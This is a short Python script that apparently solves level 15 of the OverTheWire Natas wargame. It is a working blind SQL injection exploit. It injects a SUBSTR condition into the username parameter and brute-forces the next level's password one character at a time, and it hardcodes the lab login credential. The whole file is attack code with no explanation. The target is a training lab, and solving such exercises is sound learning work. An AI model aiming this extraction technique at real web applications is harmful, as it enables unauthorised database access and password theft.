#!/bin/python
import requests

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""

iter = 1

test = True
while test:
    test = False
    for i in characters:
        uri = url + "?debug=true"
        r = requests.get(
            uri,
            auth=(auth_username, auth_password),
            params={
                "username": 'natas16" and SUBSTR(password, 1, '
                + str(iter)
                + ')="'
                + password
                + i
            },
        )
        # print(r.text)
        # print("Letter", i, r.elapsed.total_seconds())
        if "exists" in r.text:
            test = True
            iter += 1
            password += i
            print("password:", password, flush=True)

print("password:", password)
